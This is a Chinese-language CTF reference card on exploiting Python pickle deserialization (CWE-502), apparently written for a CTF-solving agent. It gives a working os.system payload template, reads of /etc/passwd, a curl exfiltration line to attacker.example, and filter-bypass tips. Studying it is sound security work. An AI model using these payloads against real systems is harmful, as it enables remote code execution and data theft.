---
source_url: knowledge/reference/web/pickle-deserialization.md
source_title: Python pickle 反序列化利用模式 — reviewed solution pattern
source_version: "1.0"
publisher: CTF-Agent reviewed corpus
license: CC-BY-4.0
retrieved_at: 2026-08-31
topic: web
cwe_id: CWE-502
---

# Python pickle 反序列化利用模式

> 本文为通用技术模式卡片，不含任何具体题目的 flag、附件路径、端点地址或原始 payload。

## 核心概念

pickle 序列化的是"对象构造指令"而非纯数据：`pickle.loads()` 反序列化时会执行对象协议里的还原指令，攻击者构造恶意字节流即可在**反序列化瞬间**触发任意代码执行（CWE-502）。常见出现位置：session/cookie/token 中 base64 编码的 pickle、上传 `.pkl` 文件、接受 base64 数据的 API 接口。

**检测信号**：源码出现 `pickle.loads` / `cPickle.loads`；或输入经 base64 解码后以 pickle 魔数开头（protocol 0 以 `(` 开头、protocol 2 为 `\x80\x02`、protocol 4 为 `\x80\x04`）。

## 关键细节

**利用原理**：自定义类的 `__reduce__` 返回 `(callable, args)`，pickle 反序列化时执行 `callable(*args)`。

**最小利用模板**（本地生成 payload 文件）：
```python
import pickle

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
open('payload.pkl','wb').write(payload)
# 若目标是 base64 载体：base64.b64encode(payload)
```
服务端 `pickle.loads(open('payload.pkl','rb').read())` 时即执行 `os.system('id')`。

**回显控制**：`os.system` 只返回退出码、无输出——需要结果时改用：
```python
return (os.popen, ('cat /etc/passwd',))          # 返回文件对象，可读
# 或把结果写回可访问位置：os.system('cat /etc/passwd > /tmp/out')
# 或外带：os.system('curl http://attacker.example/$(cat /etc/passwd | base64)')
```
写文件 / 外带方式要结合题目网络环境（能否出网）选择。

**沙箱绕过**：限制 `__reduce__` 可用的模块/类时，优先用反序列化环境里**已 import 的模块**（如 flask、os 常已加载）；`__reduce__` 的 callable 必须是模块级可导入对象，不能是 lambda 或闭包。

**协议兼容**：高版本 pickle 协议（如 protocol 4/5）在低版本 Python 上无法解析——目标为老环境时用 `pickle.dumps(obj, protocol=0)`（纯 ASCII 可读）或 protocol 2。

**辅助分析**：
```bash
python -c "import pickletools,base64,sys; pickletools.dis(base64.b64decode(sys.argv[1]))" <b64>
```
`pickletools.dis` 逐 opcode 打印还原指令，便于手工构造绕过（如 GLOBAL 指令的模块/类名可被过滤器检查，此时换用 `STACK_GLOBAL` 等变体）。

## 常见坑

- `__reduce__` 里不能直接写 `lambda`——pickle 无法序列化函数对象，必须用模块级函数/类。
- 返回 `(os.system, ...)` 时确认 `os` 已在 payload 所在模块 import，否则 `__reduce__` 执行时 `NameError`。
- 服务端可能 `pickle.loads` 后**不使用返回值**——没关系，代码已在 loads 时执行。
- base64 载体注意服务端解码方式（urlsafe vs 标准 base64），payload 尾部补 `=` 情况要匹配。
- 部分场景只允许传**短串**（如 cookie 长度限制），改用 protocol 0 压缩体积或把命令执行换成更短链。
- 反序列化前有 `type` 检查（如要求是 dict）时，改为让 `dict` 的构造过程触发（如 `__reduce__` 返回 `(dict, ...)`）或寻找其他 gadget 链。

## 验证方式

1. 本地 `python -c "import pickle; pickle.loads(open('payload.pkl','rb').read())"` 确认 payload 可执行且无异常。
2. 确认回显链路：直接回显 / 写文件 / 外带，三者分别验证。
3. 在目标载体（base64/上传）上先跑无副作用的探测（如 `id` 输出或 `sleep 1` 时间差）再执行敏感操作。
4. 若失败，用 `pickletools.dis` 对比 payload 与期望 opcode，逐指令修正。
